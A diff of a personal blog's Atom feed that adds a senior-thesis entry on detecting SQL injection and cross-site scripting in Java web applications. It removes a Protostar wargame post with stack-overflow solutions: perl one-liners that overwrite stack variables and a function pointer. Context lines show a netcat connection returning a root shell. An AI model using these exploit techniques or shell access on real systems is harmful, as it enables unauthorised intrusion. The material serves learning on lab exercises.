@@ -4,7 +4,7 @@
   <title><![CDATA[Louis Li]]></title>
   <link href="http://louisrli.github.io/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2015-02-05T20:27:37-05:00</updated>
+  <updated>2015-05-07T08:38:44-04:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -12,6 +12,38 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Senior Thesis: Security Analysis of Java Web Applications Using String Constraint Analysis]]></title>
+    <link href="http://louisrli.github.io/blog/2015/05/03/senior-thesis/"/>
+    <updated>2015-05-03T00:00:00-04:00</updated>
+    <id>http://louisrli.github.io/blog/2015/05/03/senior-thesis</id>
+    <content type="html"><![CDATA[<p>I submitted my undergraduate thesis at the beginning of April, titled “Security Analysis of Java Web
+Applications Using String Constraint Analysis.” I was advised by Professor Stephen Chong.</p>
+
+<!-- more -->
+
+<p>Here’s the abstract:</p>
+
+<blockquote>
+
+  <p>Web applications are exposed to myriad security vulnerabilities related to malicious user string
+input. In order to detect such vulnerabilities in Java web applications, this project employs string
+constraint analysis, which approximates the values that a string variable in a program can take on.
+In string constraint analysis, program analysis generates string constraints – assertions about the
+relationships between string variables. We design and implement a dataflow analysis for Java
+programs that generates string constraints and passes those constraints to the CVC4 SMT solver to
+find a satisfying assignment of string variables. Using example programs, we illustrate the
+feasibility of the system in detecting certain types of web application vulnerabilities, such as SQL
+injection and cross-site scripting.</p>
+</blockquote>
+
+<p><a href="http://louisrli.github.io/downloads/louisli-thesis.pdf">Download the PDF</a> or view it below. </p>
+
+<embed src="http://louisrli.github.io/downloads/louisli-thesis.pdf" type="application/pdf" width="100%" height="600" />
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Being a Better Teaching Assistant: Five Concrete Tips]]></title>
@@ -2066,51 +2098,6 @@ Program exited normally.</code></pre></div>
 <div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
 <span class="go">whoami</span>
 <span class="go">root</span></code></pre></div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
-    <updated>2012-08-18T00:00:00-04:00</updated>
-    <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
-    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
-
-<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
-
-<h1 id="solutions">Solutions</h1>
-<p>## Stack: Level 0
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> perl -e <span class="s2">&quot;print &#39;a&#39;x65&quot;</span> <span class="p">|</span> ./stack0
-<span class="go">you have changed the &#39;modified&#39; variable</span></code></pre></div>
-
-<h2 id="stack-level-1">Stack: Level 1</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./stack1 <span class="k">$(</span>perl -e <span class="s2">&quot;print &#39;a&#39;x64 . dcba&quot;</span><span class="k">)</span>
-<span class="go">you have correctly got the variable to the right value</span></code></pre></div>
-
-<!-- more -->
-<p>## Stack: Level 2
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&quot;$(perl -e &quot;</span>print ax64<span class="s2">&quot;)\n\r\n\r&quot;</span><span class="k">)</span>
-<span class="gp">$</span> ./stack2
-<span class="go">you have correctly modified the variable</span></code></pre></div>
-
-<h2 id="stack-level-3">Stack: Level 3</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -d ./stack3 <span class="p">|</span> grep win
-<span class="go">08048424 &lt;win&gt;:</span>
-<span class="gp">$</span> <span class="nb">echo</span> -e <span class="s2">&quot;$(perl -e &quot;</span>print <span class="s1">&#39;a&#39;</span>x64<span class="s2">&quot;)\x24\x84\x04\x08&quot;</span> <span class="p">|</span> ./stack3
-<span class="go">calling function pointer, jumping to 08048424</span>
-<span class="go">code flow successfully changed</span></code></pre></div>
 
 ]]></content>
   </entry>
